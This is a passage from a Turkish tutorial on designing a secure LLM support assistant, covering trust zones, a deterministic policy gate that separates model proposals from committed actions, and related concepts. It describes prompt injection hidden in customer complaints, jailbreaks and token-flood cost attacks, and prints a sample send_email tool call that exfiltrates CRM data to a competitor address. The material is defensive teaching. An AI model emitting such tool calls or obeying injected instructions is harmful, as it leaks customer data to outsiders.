Demo kusursuz geçti. Destek asistanı müşteri kaydını getirdi, üç sayfalık bir şikâyeti dört cümleye indirdi ve kibar bir yanıt taslağı hazırladı. Sonra güvenlik ekibinden biri iki soru sordu: *"Bu sistemde tam olarak neyi koruyoruz? Bunların her birinin sahibi kim?"* Odaya sessizlik çöktü. AI ekibi model sağlayıcısının güvenlik filtresini gösterdi, platform ekibi API gateway'i, iş birimi sahibi ise "güvenliğe zaten BT bakıyor" diye düşünüyordu.

O sessizlik, yapay zekâ sistemlerinde en sık rastlanan güvenlik açığıdır ve tek bir bileşendeki hatadan kaynaklanmaz. Asistanımızın tek bir aracı var: `send_email`. Ama bu araç sistemin türünü değiştiriyor. Araç yokken manipüle edilmiş bir modelin yapabileceği en kötü şey ekrana kötü bir paragraf yazmaktır. Araç varken bir müşterinin şikâyet metnine gizlenmiş tek bir cümle, asistanın müşteri kaydını dışarıdaki bir adrese göndermesine yol açabilir. Modelde hiçbir şey değişmedi. Değişen şey **etki alanı** (blast radius), yani tek bir yanlış token'ın tetikleyebileceği gerçek dünyadaki sonuçların kümesi oldu.

> **Yapay Zekâ Güvenliğinin Temel Mimari Aksiyomu (Propose vs. Commit):**
> Bir yapay zekâ modelinin çıktısı sistemin geri kalanı için asla yürütülebilir bir komut değildir; yalnızca doğrulanmamış bir **öneridir** (*proposal*). Büyük dil modelleri kendi başlarına hiçbir işlem yetkisine sahip olamaz. Yan etki üreten her eylem, deterministik bir Politika Zorlama Noktası (*PEP — Policy Enforcement Point*) tarafından kullanıcının yetki sınırları ve parametre kısıtları içinde doğrulanmadıkça taahhüt edilemez (*commit*).

Bu yazı *Secure AI by Design* serisinin kurucu ilk bölümüdür. İşe filtrelerden ya da prompt sihirbazlığından başlamayacağız. Önce neyin korunmaya değer olduğuna karar vereceğiz: veri, model, işlem yetkisi ve hizmet sürekliliği. Ardından ekiplerin sürekli birbirine karıştırdığı dört kavramı kesin sınırlarla ayıracağız: güvenlik, emniyet, mahremiyet ve güvenilirlik. Sonra dört tasarım ilkesi koyacak, "katmanlı savunma"nın bağımsız sistemlerde riski nasıl geometrik olarak azalttığını, ancak ortak nedenli arızalar (*Common Cause Failures*) ve korelasyon altında nasıl sessizce çöktüğünü güvenilirlik mühendisliğinin $\beta$-faktör modeliyle kanıtlayacağız. Yazının sonunda elinizde, sonraki bölümlerin üzerine inşa edileceği altı güven bölgesine ayrılmış bir referans mimari, tek sayfalık bir ilke listesi ve kurumsal bir RACI matrisi olacak.

> **Serinin ortak örneği:** Kurumsal bir *destek asistanı*. Asistan (1) müşteri kaydını getirir, (2) şikâyeti özetler ve (3) **yalnızca kullanıcı onayladıktan sonra ve izinli alıcıya** e-posta gönderebilir. Serideki bütün veriler sentetiktir; gerçek kurum sistemleri ya da sırlar kullanılmaz. Her bölüm aynı sisteme bir sonraki katmanı ekler.

> **Bu yazının sonunda**
>
> - Bir AI sisteminin dört varlık sınıfını sayabilecek ve altı güven bölgesi (Z0–Z5) mimari diyagramında her birinin nerede yaşadığını gösterebileceksiniz.
> - Güvenlik, emniyet, mahremiyet ve güvenilirliği birbirinden ayırabilecek, her birinin hangi arızayı önlediğini savunabileceksiniz.
> - Katmanlı kontrollerin bağımsızlık varsayımını ve katmanlar arasındaki ortak kör noktaların riski nasıl katladığını güvenilirlik mühendisliğinin $\beta$-faktör formülüyle hesaplayabileceksiniz.
> - "Propose vs. Commit" ayrımını uygulayan, kendi projenize doğrudan kopyalayabileceğiniz tek sayfalık bir ilke listesine ve bir RACI matrisine sahip olacaksınız.

**Bu yazıda**

- [1. Ortak örnek: Bir destek asistanının anatomisi ve altı güven bölgesi](#1-ortak-örnek-bir-destek-asistanının-anatomisi-ve-altı-güven-bölgesi)
- [2. Neyi koruyoruz? Dört varlık sınıfı](#2-neyi-koruyoruz-dört-varlık-sınıfı)
- [3. Yapay zekâ için CIA: Gizlilik, bütünlük, erişilebilirlik ve güvenli davranış](#3-yapay-zekâ-için-cia-gizlilik-bütünlük-erişilebilirlik-ve-güvenli-davranış)
- [4. Ekiplerin karıştırdığı dört kavram: Güvenlik, emniyet, mahremiyet, güvenilirlik](#4-ekiplerin-karıştırdığı-dört-kavram-güvenlik-emniyet-mahremiyet-güvenilirlik)
- [5. Dört tasarım ilkesi](#5-dört-tasarım-ilkesi)
- [6. Katmanlı savunmanın matematiği: Beta-faktör modeli ve ortak nedenli çöküş](#6-katmanlı-savunmanın-matematiği-beta-faktör-modeli-ve-ortak-nedenli-çöküş)
- [7. Mühendisliğin iki gözü: Kurulum zamanı ve çalışma zamanı](#7-mühendisliğin-iki-gözü-kurulum-zamanı-ve-çalışma-zamanı)
- [8. Neyin sahibi kim? Sorumluluk matrisi](#8-neyin-sahibi-kim-sorumluluk-matrisi)
- [9. Pratik çıktı: Tek sayfalık ilke listesi](#9-pratik-çıktı-tek-sayfalık-ilke-listesi)
- [10. Seri buradan nereye gidiyor?](#10-seri-buradan-nereye-gidiyor)
- [Bütün hikâye altı satırda](#bütün-hikâye-altı-satırda)
- [Terimler sözlüğü](#terimler-sözlüğü)
- [Daha derine inmek için](#daha-derine-inmek-için)

---

## 1. Ortak örnek: Bir destek asistanının anatomisi ve altı güven bölgesi

Bir güvenlik konuşması ancak tahtada mimari güven sınırları çizildiğinde somutlaşır. Bu yüzden herhangi bir ilkeden önce, on iki yazı boyunca savunacağımız destek asistanı mimarisini kurumsal güvenlik standartlarına (NIST AI 600-1 ve Google SAIF) uygun olarak altı ayrı **güven bölgesine** (*trust zones*) ayıralım.

Bir müşteri temsilcisi sohbet penceresini açıp şunu yazıyor: *"4711 numaralı müşterinin son şikâyetini özetle ve bir yanıt taslağı hazırla."* Bu istek sırasıyla altı güven bölgesinden geçer:

1. **Bölge 0 (Zone 0 — Dış Güvenilmeyen Alan):** Şirket dışındaki kişilerin yazdığı destek e-postaları, harici web kancaları ve web formları. Buradaki her bayt potansiyel olarak düşmancadır.
2. **Bölge 1 (Zone 1 — Ağ ve Giriş Sınırı):** Şirket içi çalışan oturumu, mTLS bağlantısı, API Gateway, WAF, rate limiter ve temel PII maskeleme katmanı.
3. **Bölge 2 (Zone 2 — Karantinaya Alınmış Muhakeme Düzlemi):** Orkestratörün bağlam oluşturucusu ve büyük dil modeli (LLM). Güvenilmeyen şikâyet metni ile sistem prompt'u burada tek bir token dizisinde birleşir. Model burada kesinlikle **izole bir önerici** (*proposer*) olarak çalışır; hiçbir harici API anahtarına doğrudan dokunamaz.
4. **Bölge 3 (Zone 3 — Politika Zorlama ve Karar Noktası / PEP & PDP):** Modelin ürettiği metin ve araç çağrısı isteklerini yakalayan deterministik güvenlik kapısı. Kullanıcının kimlik kapsamını, araç şemasını, parametre kısıtlarını doğrular ve yüksek riskli eylemler için insan onayını zorunlu tutar.
5. **Bölge 4 (Zone 4 — Yürütme ve Araç Düzlemi):** Kısıtlı sandbox ortamlarında çalışan gerçek araçlar (`get_customer_record`, `summarize_complaint`, `send_email`). Yalnızca Bölge 3'ten geçerli bir imza veya yetki bileti almış istekleri yürütür.
6. **Bölge 5 (Zone 5 — Değişmez Denetim ve Telemetri Düzlemi):** OpenTelemetry GenAI semantik standartlarına uygun, PII'dan arındırılmış, WORM (*Write Once Read Many*) depolamada saklanan denetim izleri.

Burada hayati ayrıntı **güvenin yönü ve yürütme kopukluğudur**. Çalışanın kimliği doğrulanmıştır. Orkestratör güvenilirdir. Ancak şikâyet metnini dışarıdan biri yazmıştır. Şikâyet metni modele girdiğinde modelin dikkati manipüle edilebilir. Model manipüle edilse bile, Bölge 3'teki deterministik politika kapısı aşılmadığı sürece hiçbir dış yan etki gerçekleşemez. Aşağıdaki mimari diyagram bu altı güven bölgesini ve aralarındaki kritik kontrol noktasını göstermektedir:

<!-- fig:p1_arch -->
<svg viewBox="0 0 720 516" role="img" aria-label="Destek asistanının altı güven bölgesine ayrılmış mimarisi. Bölge 0 dış güvenilmeyen göndericiyi içerir. Bölge 1 çalışan ve sohbet arayüzüdür. Bölge 2 karantinaya alınmış orkestratör ve LLM muhakeme düzlemidir. Bölge 3 deterministik Politika Zorlama Noktası PEP ve PDP kapısıdır; modelin önerilerini denetler. Bölge 4 yetkilendirilmiş araçların çalıştığı yürütme düzlemidir. Bölge 5 ise değişmez log ve denetim düzlemidir." style="max-width:100%;height:auto;display:block;margin:var(--sp-5) auto;font-family:var(--font-sans)">
<defs>
<marker id="p1a-arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-text-mute)"/></marker>
<marker id="p1a-w" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-warn)"/></marker>
<marker id="p1a-r" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-danger)"/></marker>
<marker id="p1a-g" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-accent-2)"/></marker>
<marker id="p1a-p" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-accent)"/></marker>
</defs>
<text x="16" y="24" text-anchor="start" style="fill:var(--c-accent);font-size:14px;font-weight:700;letter-spacing:.02em">Destek Asistanı: Altı Güven Bölgesi ve Propose vs. Commit Ayrımı</text>
<rect x="16" y="56" width="688" height="376" rx="10" style="fill:none;stroke:var(--c-border);stroke-width:1;stroke-dasharray:4 4"/>
<!-- Zone 0 -->
<rect x="28" y="320" width="130" height="92" rx="6" style="fill:var(--c-danger);fill-opacity:.08;stroke:var(--c-danger);stroke-width:1.2;stroke-dasharray:4 3"/>
<text x="93" y="338" text-anchor="middle" style="fill:var(--c-danger);font-size:11px;font-weight:700">Z0: DIŞ GÜVENİLMEYEN</text>
<text x="93" y="362" text-anchor="middle" style="fill:var(--c-text);font-size:12px">Dış Gönderici</text>
<text x="93" y="378" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10.5px">şikâyet e-postası</text>
<text x="93" y="394" text-anchor="middle" style="fill:var(--c-danger);font-size:10px;font-family:var(--font-mono)">payload enjeksiyonu</text>
<!-- Zone 1 -->
<rect x="28" y="76" width="130" height="210" rx="6" style="fill:var(--c-surface);stroke:var(--c-accent);stroke-width:1.2"/>
<text x="93" y="94" text-anchor="middle" style="fill:var(--c-accent);font-size:11px;font-weight:700">Z1: GİRİŞ SINIRI</text>
<rect x="38" y="110" width="110" height="60" rx="5" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1"/>
<text x="93" y="132" text-anchor="middle" style="fill:var(--c-text);font-size:12px;font-weight:600">Çalışan</text>
<text x="93" y="148" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10.5px">OAuth2 · mTLS</text>
<rect x="38" y="186" width="110" height="84" rx="5" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1"/>
<text x="93" y="206" text-anchor="middle" style="fill:var(--c-text);font-size:12px;font-weight:600">Sohbet UI &amp; Gateway</text>
<text x="93" y="224" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10.5px">oturum bağlamı</text>
<text x="93" y="240" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10.5px">rate limiter</text>
<text x="93" y="256" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10.5px">PII maskeleme</text>
<!-- Zone 2 -->
<rect x="180" y="76" width="180" height="336" rx="6" style="fill:var(--c-surface);stroke:var(--c-warn);stroke-width:1.3"/>
<text x="270" y="94" text-anchor="middle" style="fill:var(--c-warn);font-size:11px;font-weight:700">Z2: İZOLE MUHAKEME</text>
<rect x="190" y="110" width="160" height="110" rx="5" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1"/>
<text x="270" y="130" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Orkestratör</text>
<text x="270" y="148" text-anchor="middle" style="fill:var(--c-text-mute);font-size:11px">prompt montajı</text>
<text x="270" y="164" text-anchor="middle" style="fill:var(--c-text-mute);font-size:11px">veri/talimat ayrımı</text>
<text x="270" y="180" text-anchor="middle" style="fill:var(--c-danger);font-size:10.5px">güvenilmeyen metin</text>
<text x="270" y="196" text-anchor="middle" style="fill:var(--c-danger);font-size:10.5px">burada buluşur</text>
<line x1="270" y1="220" x2="270" y2="246" marker-end="url(#p1a-arr)" style="stroke:var(--c-text-mute);stroke-width:1.5"/>
<rect x="190" y="248" width="160" height="88" rx="5" style="fill:var(--c-surface-2);stroke:var(--c-accent-2);stroke-width:1.2"/>
<text x="270" y="268" text-anchor="middle" style="fill:var(--c-accent-2);font-size:13px;font-weight:600">LLM Çıkarım Motoru</text>
<text x="270" y="286" text-anchor="middle" style="fill:var(--c-text-mute);font-size:11px">salt metin / öneri üretici</text>
<text x="270" y="302" text-anchor="middle" style="fill:var(--c-warn);font-size:10.5px;font-weight:600">YALNIZCA ÖNERİR</text>
<text x="270" y="318" text-anchor="middle" style="fill:var(--c-warn);font-size:10.5px;font-weight:600">(ASLA ÇALIŞTIRAMAZ)</text>
<!-- Zone 3 -->
<rect x="380" y="76" width="140" height="336" rx="6" style="fill:var(--c-accent);fill-opacity:.06;stroke:var(--c-accent);stroke-width:1.5"/>
<text x="450" y="94" text-anchor="middle" style="fill:var(--c-accent);font-size:11px;font-weight:700">Z3: PEP / PDP KAPISI</text>
<rect x="390" y="110" width="120" height="286" rx="5" style="fill:var(--c-surface);stroke:var(--c-accent);stroke-width:1.2"/>
<text x="450" y="132" text-anchor="middle" style="fill:var(--c-text);font-size:12px;font-weight:700">Politika Zorlama</text>
<text x="450" y="148" text-anchor="middle" style="fill:var(--c-accent);font-size:11px;font-weight:600">PEP / PDP</text>
<line x1="400" y1="160" x2="500" y2="160" style="stroke:var(--c-border);stroke-width:1"/>
<text x="450" y="178" text-anchor="middle" style="fill:var(--c-text);font-size:10.5px">1. Şema Doğrulama</text>
<text x="450" y="196" text-anchor="middle" style="fill:var(--c-text);font-size:10.5px">2. Kullanıcı Kapsamı</text>
<text x="450" y="214" text-anchor="middle" style="fill:var(--c-text);font-size:10.5px">3. Alıcı Allowlist&#x27;i</text>
<text x="450" y="232" text-anchor="middle" style="fill:var(--c-text);font-size:10.5px">4. Parametre İmzası</text>
<text x="450" y="250" text-anchor="middle" style="fill:var(--c-text);font-size:10.5px">5. İnsan Onayı (HITL)</text>
<rect x="398" y="270" width="104" height="42" rx="4" style="fill:var(--c-warn);fill-opacity:.15;stroke:var(--c-warn);stroke-width:1"/>
<text x="450" y="286" text-anchor="middle" style="fill:var(--c-text);font-size:10px;font-weight:600">Onay Geçerlilik:</text>
<text x="450" y="300" text-anchor="middle" style="fill:var(--c-warn);font-size:9.5px;font-family:var(--font-mono)">HMAC(id,to,body)</text>
<text x="450" y="334" text-anchor="middle" style="fill:var(--c-accent);font-size:10.5px;font-weight:700">COMMIT / DROP</text>
<text x="450" y="352" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10px">karar verilir</text>
<!-- Zone 4 -->
<rect x="540" y="76" width="150" height="210" rx="6" style="fill:var(--c-surface);stroke:var(--c-success);stroke-width:1.2"/>
<text x="615" y="94" text-anchor="middle" style="fill:var(--c-success);font-size:11px;font-weight:700">Z4: YÜRÜTME &amp; ARAÇLAR</text>
<rect x="548" y="110" width="134" height="42" rx="4" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1"/>
<text x="615" y="127" text-anchor="middle" style="fill:var(--c-text);font-size:11px;font-family:var(--font-mono)">get_customer_record</text>
<text x="615" y="141" text-anchor="middle" style="fill:var(--c-text-mute);font-size:9.5px">CRM (salt okunur)</text>
<rect x="548" y="160" width="134" height="42" rx="4" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1"/>
<text x="615" y="177" text-anchor="middle" style="fill:var(--c-text);font-size:11px;font-family:var(--font-mono)">summarize_complaint</text>
<text x="615" y="191" text-anchor="middle" style="fill:var(--c-text-mute);font-size:9.5px">Arşiv (salt okunur)</text>
<rect x="548" y="210" width="134" height="58" rx="4" style="fill:var(--c-warn);fill-opacity:.12;stroke:var(--c-warn);stroke-width:1.2"/>
<text x="615" y="228" text-anchor="middle" style="fill:var(--c-text);font-size:11px;font-family:var(--font-mono);font-weight:700">send_email</text>
<text x="615" y="244" text-anchor="middle" style="fill:var(--c-danger);font-size:10px;font-weight:600">YÜKSEK ETKİ ALANI</text>
<text x="615" y="258" text-anchor="middle" style="fill:var(--c-text-mute);font-size:9px">yalnız onaylı alıcıya</text>
<!-- Zone 5 -->
<rect x="540" y="302" width="150" height="110" rx="6" style="fill:var(--c-surface-2);stroke:var(--c-border);stroke-width:1.2"/>
<text x="615" y="320" text-anchor="middle" style="fill:var(--c-text-mute);font-size:11px;font-weight:700">Z5: DEĞİŞMEZ DENETİM</text>
<text x="615" y="344" text-anchor="middle" style="fill:var(--c-text);font-size:11px">OTel GenAI Spans</text>
<text x="615" y="362" text-anchor="middle" style="fill:var(--c-text);font-size:11px">WORM Güvenlik Günlüğü</text>
<text x="615" y="380" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10px">Tuzlu Token Hash&#x27;leri</text>
<text x="615" y="396" text-anchor="middle" style="fill:var(--c-text-mute);font-size:10px">İmzalı Karar Kanıtı</text>
<!-- Connections -->
<line x1="148" y1="190" x2="190" y2="190" marker-end="url(#p1a-p)" style="stroke:var(--c-accent);stroke-width:1.5"/>
<path d="M158 366 H190 V220" marker-end="url(#p1a-r)" style="fill:none;stroke:var(--c-danger);stroke-width:1.5;stroke-dasharray:4 3"/>
<line x1="350" y1="290" x2="390" y2="290" marker-end="url(#p1a-w)" style="stroke:var(--c-warn);stroke-width:1.6"/>
<text x="370" y="280" text-anchor="middle" style="fill:var(--c-warn);font-size:9px;font-family:var(--font-mono)">proposal</text>
<line x1="510" y1="210" x2="548" y2="210" marker-end="url(#p1a-g)" style="stroke:var(--c-accent-2);stroke-width:1.6"/>
<text x="528" y="200" text-anchor="middle" style="fill:var(--c-accent-2);font-size:9px;font-family:var(--font-mono)">commit</text>
<path d="M450 396 V416 H540 V360" marker-end="url(#p1a-arr)" style="fill:none;stroke:var(--c-text-mute);stroke-width:1.2"/>
<!-- Bottom Educational Banner -->
<rect x="16" y="444" width="688" height="62" rx="6" style="fill:var(--c-accent);fill-opacity:.07;stroke:var(--c-accent);stroke-width:1.2"/>
<text x="28" y="463" text-anchor="start" style="fill:var(--c-accent);font-size:11px;font-weight:700;letter-spacing:.02em">💡 TEMEL MİMARİ KANUN: PROPOSE (ÖNERİ) İLE COMMIT (İCRA) BİRBİRİNDEN AYRIDIR</text>
<text x="28" y="481" text-anchor="start" style="fill:var(--c-text);font-size:10.5px">Yapay zekâ muhakeme düzlemi (Z2) dünyayı doğrudan değiştiremez; yalnızca yapılandırılmış bir eylem önerir (propose).</text>
<text x="28" y="497" text-anchor="start" style="fill:var(--c-text-mute);font-size:10px">Eylemin icrası (commit) yalnızca deterministik Politika Zorlama Noktası (PEP - Z3) tarafından onaylandığında gerçekleşir.</text>
</svg>

> [!TIP]
> **Öğrenme Kontrolü: Model Güvenliği ile Sistem Güvenliği Arasındaki Uçurum**
> Bir modeli RLHF veya DPO ile "kötü niyetli komutları reddedecek biçimde eğitmek" bir **model emniyeti** (*model safety*) çalışmasıdır. Ancak bir güvenlik mimarı için bu asla bir güvenlik sınırı kabul edilemez. Tarihsel olarak her dil modeli akıllıca kurgulanmış bir jailbreak veya semantik saptırma dizisiyle manipüle edilebilir. **Sistem güvenliği**, model tamamen ele geçirilse ve kötü niyetli bir araç çağrısı üretse dahi, Bölge 3'teki deterministik Politika Zorlama Noktası'nın bu eylemi sessizce düşürmesini garanti etmektir.

---

## 2. Neyi koruyoruz? Dört varlık sınıfı

Bir banka şubesini düşünün. Kasadaki nakit para somut bir varlıktır. Ancak kasanın zaman ayarlı şifresi, veznedarın transfer onay anahtarı ve şubenin mesai saatlerinde açık kalabilmesi de birer varlıktır. Şifreyi öğrenen bir saldırgan henüz tek bir kuruş çalmamıştır; fakat şubenin bütün operasyonel kontrolünü eline geçirmiştir.

Bir yapay zekâ sisteminde de aynı dört varlık sınıfı mevcuttur ve mimarinin farklı bölgelerinde ikamet eder:

| Varlık sınıfı | Destek asistanımızda | Güven Bölgesi | "Kaybetmek" neye benzer? |
| --- | --- | --- | --- |
| **Veri** | Müşteri kayıtları, şikâyet arşivi, konuşma geçmişi, vektör dizini, denetim logları | Z1, Z4, Z5 | Bir müşterinin PII verisi başka bir kullanıcının özetinde görünür; şikâyet metni yetkisiz bir dış log aktarımına sızar. |
| **Model ve yapılandırması** | Model ağırlıkları, sistem prompt'u, araç JSON şemaları, guardrail eşikleri, değerlendirme setleri | Z2 | Sistemin gizli prompt'u sızdırılır; araç açıklamalarına zehirli yönergeler enjekte edilir; güvenlik sınıflandırıcı eşiği sessizce gevşetilir. |
| **İşlem yetkisi** | `send_email` çağırma hakkı, CRM API kimlik bilgileri, OAuth kapsamları, onay token'ları | Z3, Z4 | Asistan kullanıcının hiç onaylamadığı bir e-postayı gönderir; sızan servis anahtarıyla tüm CRM veritabanı dışarı çekilir. |
| **Hizmet sürekliliği** | Uç nokta erişilebilirliği, çıkarım gecikme bütçesi, token ve API harcama kotası | Z1, Z2, Z4 | Kötü niyetli bir token seli aylık GPU bütçesini iki saatte tüketir; guardrail servisi çöker ve sistem kontrolsüz açık kalır. |

Bu tabloda iki satır bir güvenlik mimarının radarında en üstte durmalıdır:

**İşlem yetkisi**, klasik makine öğrenimi modellerinde bulunmayan bir varlıktır. Geleneksel bir churn tahmin modeli yalnızca bir olasılık skoru ($[0, 1]$) üretir; tek başına hiçbir veritabanını silemez, hiçbir para transferi başlatamaz. Araç kullanan bir ajan ise yetkisini birinden *ödünç alır*: oturum açmış kullanıcıdan, bir servis hesabından ya da ikisinden birden. OWASP'nin kurumsal LLM Uygulamaları Top 10 listesi *Excessive Agency* (aşırı özerklik/yetki) maddesini ilk üç arasına boşuna yerleştirmedi. OWASP Ajan Güvenliği (Agentic Security) listesi de *Agent Goal Hijack* (ASI01) ile açılır: Bir yapay zekâ sistemi işlem yetkisine kavuştuğu anda, manipüle edilmiş bir token dizisi artık yalnızca bir metin kalitesi kusuru değil, doğrudan fiziksel ve finansal bir ihlaldir.

**Hizmet sürekliliği** doğrudan *finansal tükenmeyi* de kapsar. Modele her çağrıda 64.000 token ürettiren döngüsel bir enjeksiyon isteği klasik bir sunucu çökmesi yaratmayabilir. Fakat saldırgan bu istekleri paralel olarak bastığında birkaç saat içinde binlerce dolarlık API faturası oluşturur ve bütçe tavanına çarpılarak sistem tüm meşru kullanıcılar için erişilemez hâle gelir (OWASP *Unbounded Consumption*).

> [!NOTE]
> **Düşünce Deneyi: Tek Bir Token'ın Maliyeti**
> Modelin ürettiği metin akışında şu tek satırın belirdiğini hayal edin:
> `{"name": "send_email", "arguments": {"to": "audit@competitor.com", "body": "ALL_CRM_DATA..."}}`
> Model bu token dizisini ürettiğinde kurumsal sistemler henüz zarar görmüş müdür? Hayır. Sistem ancak ve ancak orkestratör bu metni JSON olarak ayrıştırıp SMTP soketine yazdığı anda ihlal edilmiş olur. Güvenlik açığı modelin bu cümleyi hayal edebilmesi değil; sistem mimarisinin bu ham hayali denetimsiz bir işleme dönüştürmesidir.

---

## 3. Yapay zekâ için CIA: Gizlilik, bütünlük, erişilebilirlik ve güvenli davranış

Klasik siber güvenlik, varlıkların korunmasını üç temel sütunla tarif eder: **Gizlilik** (*Confidentiality*), **Bütünlük** (*Integrity*) ve **Erişilebilirlik** (*Availability*). Bu CIA üçlüsü yapay zekâ sistemlerinde de geçerlidir; ancak fiziksel dünyadaki tezahürleri temelden farklılaşır:

- **Gizlilik**, yalnızca veritabanının çalınmasıyla değil; modelin ezberlediği bir eğitimi veya müşterinin gizli PII verisini başka bir oturuma aktarmasıyla, sistem prompt'unun sızdırılmasıyla ya da embedding vektörlerinin tersine mühendislikle düz metne çevrilmesiyle (Vec2Text saldırıları) bozulur.
- **Bütünlük**, klasik dünyada veritabanı satırlarının değiştirilmesidir. Yapay zekâda ise en yaygın bütünlük kaybı **davranışsal bütünlüğün** (*behavioral integrity*) yitirilmesidir. Prompt injection saldırısı modelin tek bir ağırlık baytını bile değiştirmez; buna rağmen sistemin karar mekanizmasını yetkili kullanıcının niyetinden saptırıp saldırganın talimatına bağlar.
- **Erişilebilirlik**, servis sunucularının DDoS ile düşürülmesinin yanı sıra, token tüketim patlamaları, guardrail servislerinin zaman aşımına uğraması ve recursive (özyinelemeli) ajan kilitlenmeleriyle çöker.

Fakat klasik CIA üçlüsü modern yapay zekânın en sinsi tehlikesini tarif etmekte yetersiz kalır: **Güvenli davranış** (*Safe Behavior*).

Bir sistem tüm sırlarını koruyabilir, veritabanı bütünlüğü eksiksiz olabilir ve %100 kesintisiz çalışabilir. Buna rağmen bir dil modeli bir müşteriye yasal olarak yanıltıcı bir taahhüt verebilir, nefret söylemi üretebilir veya tehlikeli bir kimyasal karışım tarifi sunabilir. Bu bir gizlilik veya erişilebilirlik arızası değildir; doğrudan sistemin *davranışsal hizalanma* arızasıdır.

> **Akılda kalsın:** Yapay zekâ sistemlerinde bir *bütünlük* ihlali, diskte saklanan tek bir veriyi değiştirmeden gerçekleşebilir. Saldırgan bağlamdaki *girdiyi* saptırır; sapan girdi modelin *muhakemesini* bozar; bozulan muhakeme ise yetkisiz bir *işleme* dönüşür. Bu serideki her kontrol mekanizması o ölümcül zinciri kırmak için tasarlanmıştır.

---

## 4. Ekiplerin karıştırdığı dört kavram: Güvenlik, emniyet, mahremiyet, güvenilirlik

Mimari tasarım toplantılarında bu dört terim sıklıkla birbirinin yerine kullanılır. Sonuçta sorumluluk belirsizleşir ve ekipler birbirini bekler. Oysa her biri taban tabana zıt sorulara yanıt arar:

| Kavram | Temel Soru | Saldırgan Gerekli mi? | Örnek Sistemik Arıza | Birincil Sorumlu Ekip |
| --- | --- | --- | --- | --- |
| **Güvenlik** (*Security*) | Kötü niyetli bir *saldırgan* sisteme kasıtlı olarak yetkisiz bir işlem yaptırabilir mi? | **Evet** (Düşmanca niyet) | Şikâyete gizlenen enjeksiyonla müşteri verisinin saldırgana e-postalanması | Güvenlik Mimarı + Platform Ekibi |
| **Emniyet** (*Safety*) | Sistem meşru kullanım altında insanlara veya çevreye *zarar verebilir* mi? | **Hayır** (Sıradan kullanıcı) | Asistanın tıbbi bir soruya kendinden emin biçimde ölümcül bir dozaj önermesi | AI Emniyeti + İş Birimi Sahibi |
| **Mahremiyet** (*Privacy*) | Kişisel veriler (PII/KVKK/GDPR) amaca uygun, asgari düzeyde ve izinli mi işleniyor? | **Hayır** (Sistemik sızıntı) | Müşteri T.C. kimlik numaralarının denetimsiz biçimde iki yıl boyunca düz metin loglanması | Veri Koruma Görevlisi (DPO) + Hukuk |
| **Güvenilirlik** (*Reliability*) | Sistem normal çalışma koşullarında *doğru, tutarlı ve kararlı* sonuç üretiyor mu? | **Hayır** (İstatistiki sapma) | Destek özetleyicisinin uzun metinlerdeki ana talebi vakaların %8'inde sessizce atlaması | ML Mühendisliği + QA Ekibi |

> [!NOTE]
> **Ara Durak: Emniyet (Safety) vs Güvenlik (Security) — Neden Karıştırılmamalı?**
> Bir banka veznesinin önüne sağlam bir kurşungeçirmez cam takmak ve kimlik kontrolü koymak bir **güvenlik** (*security*) tedbiridir; kasıtlı bir soyguncuyu durdurmayı hedefler. Veznedarın müşteriye yanlış hesap özeti vermesini önlemek için eğitim vermek veya vezne zeminini ıslakken kaymayı engelleyecek malzemeyle kaplamak ise bir **emniyet ve güvenilirlik** (*safety/reliability*) tedbiridir.
> LLM dünyasında "güvenli model" dediğinizde neyi kastettiğinizi netleştirmelisiniz: Modelin küfür etmemesi emniyettir. Modelin sistem prompt'unu sızdırmaması ve e-posta gönderme yetkisini korsana kaptırmaması ise güvenliktir.

NIST'in Yapay Zekâ Risk Yönetimi Çerçevesi (NIST AI RMF 1.0) güvenilir yapay zekânın yedi özelliğini tanımlar: geçerli ve güvenilir, emniyetli, güvenli ve dayanıklı, hesap verebilir ve şeffaf, açıklanabilir, mahremiyeti güçlendirilmiş, adil. Bizim bu ayrımdaki amacımız ezber yapmak değil, **"güvenli" olmanın yedi hedeften yalnızca biri olduğunu** kavramaktır. Bir yapay zekâ sistemi mükemmel derecede emniyetli ve nazik olup, güvenlik açısından ölümcül derecede savunmasız olabilir.

---

## 5. Dört tasarım ilkesi

İlkeler, ancak kod incelemesinde veya mimari denetimde evet/hayır testine tabi tutulabildiğinde anlam taşır.

### 5.1. En az yetki ve en az özerklik (Least Privilege & Least Agency)
Her bileşene yalnızca o anki görevin gerektirdiği asgari izinleri tanıyın. Ajanik sistemlerde bu ilke OWASP tarafından **least agency** (en az özerklik) olarak genişletilir: Sisteme ihtiyaç duyduğundan daha geniş karar yetkisi vermeyin.

- *Uygulama:* `get_customer_record` aracı tüm veritabanını tarayabilen genel bir `db_admin` bağlantısıyla değil; yalnızca o an oturum açmış destek personelinin görmeye yetkili olduğu müşteri ID'sini kabul eden kısıtlı bir servis rolüyle çalışmalıdır. `send_email` aracı ise asla serbest bir `to` parametresi kabul etmemeli; yalnızca sistemde doğrulanmış müşteri kayıtlı e-posta adresine gönderim yapabilmelidir.
